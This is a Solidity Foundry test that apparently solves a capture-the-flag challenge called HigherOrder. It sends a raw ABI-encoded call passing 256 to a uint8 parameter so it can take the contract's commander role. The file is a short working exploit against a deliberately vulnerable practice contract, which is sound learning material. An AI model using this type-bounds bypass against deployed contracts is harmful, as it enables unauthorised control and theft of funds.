// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;
pragma experimental ABIEncoderV2;

import {BaseTest} from "test/utils/BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";

interface HigherOrder {
    function commander() external view returns (address);
    function treasury() external view returns (uint256);
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}


contract HigherOrderTest is BaseTest {
    function test_Attack() public {
        // contractAddress = 0xAABBCC; // your instance

        vm.startPrank(deployer);
        (bool success, ) = contractAddress.call(abi.encodeWithSignature("registerTreasury(uint8)", 256));
        
        require(success, "registerTreasury failed");
        assert(HigherOrder(contractAddress).treasury() == 256);

        HigherOrder(contractAddress).claimLeadership();

        assert(HigherOrder(contractAddress).commander() == deployer);
    }
}
